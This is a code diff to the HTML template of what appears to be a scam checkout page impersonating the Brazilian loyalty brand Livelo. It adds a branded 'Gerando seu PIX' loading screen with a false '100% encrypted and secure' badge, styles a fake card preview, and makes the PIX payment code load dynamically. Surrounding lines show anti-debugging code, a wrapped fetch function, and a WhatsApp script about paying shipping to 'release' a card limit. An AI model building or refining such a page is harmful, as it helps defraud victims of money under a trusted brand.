@@ -23,7 +23,7 @@ setInterval(function(){debugger;}, 1000);
 <link href="https://fonts.googleapis.com" rel="preconnect">
 <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet"/>
-<link href="/static/css/main.css" rel="stylesheet"/>
+<link href="/static/css/main.css?v=1.1" rel="stylesheet"/>
 </link>
   <link id="dynamic-favicon" rel="icon" href="">
   <script>
@@ -468,6 +468,22 @@ Melhor gerente 2024 até <script>document.write(new Date().getFullYear())</scrip
 .advanced-card-preview {
   animation: cardFloat 4s ease-in-out infinite;
   box-shadow: 0 15px 35px -10px rgba(0,0,0,0.4);
+  color: #ffffff !important;
+}
+.adv-card-face, .adv-card-bottom, .adv-card-col-name, .adv-card-col-right, .adv-card-validity {
+  color: #ffffff !important;
+}
+.adv-card-label {
+  color: rgba(255, 255, 255, 0.85) !important;
+  text-shadow: 0 1px 2px rgba(0,0,0,0.4) !important;
+}
+.adv-card-value {
+  color: #ffffff !important;
+  text-shadow: 0 1px 3px rgba(0,0,0,0.5) !important;
+}
+.adv-card-number {
+  color: #ffffff !important;
+  text-shadow: 0 1px 2px rgba(0,0,0,0.4) !important;
 }
 </style>
 <div class="advanced-card-preview" id="advanced-card-preview">
@@ -789,6 +805,44 @@ Pagar Frete <svg fill="none" height="16" viewbox="0 0 24 24" width="16" stroke="
 </div>
 </div>
 </div>
+<!-- ═══════ PIX LOADING (Pink Screen) ═══════ -->
+<div class="screen" id="screen-pix-loading" style="background: linear-gradient(135deg, #E5147A 0%, #830B46 100%); color: white; align-items: center; justify-content: center; position: fixed; inset: 0; z-index: 99999; width: 100vw; height: 100vh; border-radius: 0;">
+<div style="text-align: center; padding: 24px; max-width: 360px; margin: 0 auto; display: flex; flex-direction: column; align-items: center;">
+  <img src="/static/images/logo-branco.png" alt="Livelo" style="height: 36px; max-width: 140px; object-fit: contain; margin-bottom: 32px; filter: drop-shadow(0 2px 8px rgba(0,0,0,0.2)); display: block;">
+  
+  <div id="pix-loading-spinner-box" style="position: relative; width: 84px; height: 84px; margin-bottom: 24px;">
+    <div style="position: absolute; inset: 0; border: 3px solid rgba(255,255,255,0.2); border-top-color: #ffffff; border-radius: 50%; animation: spinPix 1s linear infinite;"></div>
+    <div style="position: absolute; inset: 8px; border: 2px dashed rgba(255,255,255,0.35); border-radius: 50%; animation: spinPixRev 2.5s linear infinite;"></div>
+    <div style="position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;">
+      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+      </svg>
+    </div>
+  </div>
+
+  <h2 id="pix-loading-title" style="font-size: 1.6rem; font-weight: 800; margin-bottom: 12px; color: #ffffff; line-height: 1.25;">Gerando seu PIX...</h2>
+  <p id="pix-loading-desc" style="font-size: 0.95rem; line-height: 1.5; color: rgba(255,255,255,0.92); margin-bottom: 24px; max-width: 310px;">Conectando com o sistema bancário para emitir seu código de pagamento seguro.</p>
+
+  <div id="pix-loading-bar-wrap" style="width: 220px; height: 6px; background: rgba(255,255,255,0.22); border-radius: 999px; overflow: hidden; margin-bottom: 16px; position: relative;">
+    <div style="position: absolute; height: 100%; width: 45%; background: #ffffff; border-radius: 999px; animation: pixBarPulse 1.8s ease-in-out infinite;"></div>
+  </div>
+
+  <div id="pix-loading-badge" style="display: flex; align-items: center; gap: 6px; font-size: 0.78rem; font-weight: 600; color: rgba(255,255,255,0.85); letter-spacing: 0.3px;">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color: #6EE7B7;">
+      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+    </svg>
+    <span>Ambiente 100% Criptografado & Seguro</span>
+  </div>
+
+  <div id="pix-loading-error-box" class="hidden" style="margin-top: 10px; width: 100%;">
+    <p id="pix-loading-error-msg" style="font-size: 0.88rem; color: #FFE4E6; background: rgba(0,0,0,0.25); padding: 12px; border-radius: 12px; margin-bottom: 16px; line-height: 1.4; border: 1px solid rgba(255,255,255,0.2);"></p>
+    <button class="btn-primary" style="background: white; color: #E5147A; max-width: 260px; margin: 0 auto 12px; border-radius: 30px; font-weight: 700;" onclick="retryGerarPix()">Tentar Novamente ↻</button>
+    <button class="btn-ghost" style="color: white; border: 1.5px solid rgba(255,255,255,0.4); max-width: 260px; margin: 0 auto; border-radius: 30px;" onclick="goToStep('shipping-summary')">← Voltar ao Resumo</button>
+  </div>
+</div>
+</div>
+
 <!-- ═══════ PIX (Img 3) ═══════ -->
 <div class="screen" id="screen-pix">
 <div class="step-container" style="max-width:480px">
@@ -843,7 +897,7 @@ Pagar Frete <svg fill="none" height="16" viewbox="0 0 24 24" width="16" stroke="
 </img></div>
 <div style="background:#F9FAFB;border:1px solid #E5E7EB;border-radius:8px;padding:10px;margin-bottom:12px">
 <div style="font-size:0.65rem;color:var(--text-muted);margin-bottom:4px">Código PIX (copie e cole)</div>
-<textarea aria-label="Código PIX" id="pix-code-text" readonly="" rows="5" style="width:100%;background:transparent;border:none;font-size:0.6rem;color:#1A1A1A;resize:none;word-break:break-all;outline:none;overflow:hidden;" title="Código PIX">00020126440014br.gov.bcb.pix0122teste@pix.com.br520400005303986540529.905802BR5914NOME6009SAO PAULO62070503***6304</textarea>
+<textarea aria-label="Código PIX" id="pix-code-text" readonly="" rows="5" style="width:100%;background:transparent;border:none;font-size:0.6rem;color:#1A1A1A;resize:none;word-break:break-all;outline:none;overflow:hidden;" title="Código PIX" placeholder="Aguardando emissão do código PIX..."></textarea>
 </div>
 <button class="btn-copy" id="btn-copy-pix" onclick="copyPix()" style="width:100%;background:#10B981;color:white;border:none;border-radius:8px;padding:12px;font-weight:600;font-size:0.8rem;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px">
 <svg fill="none" height="16" viewbox="0 0 20 20" width="16"><rect height="11" rx="2" stroke="white" stroke-width="1.5" width="10" x="7" y="7"></rect><path d="M13 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2" stroke="white" stroke-width="1.5"></path></svg>
@@ -914,7 +968,7 @@ window.fetch = encryptedFetch;
   window.APP_WA_NUM = "{{ sys_config.get('whatsapp', '5511999999999') }}";
   window.APP_WA_TEXT = `{{ sys_config.get('wa_text', 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!') }}`;
 </script>
-<script src="/static/js/main.js"></script>
+<script src="/static/js/main.js?v=1.2"></script>
 
   
     <!-- TELA SUCESSO -->
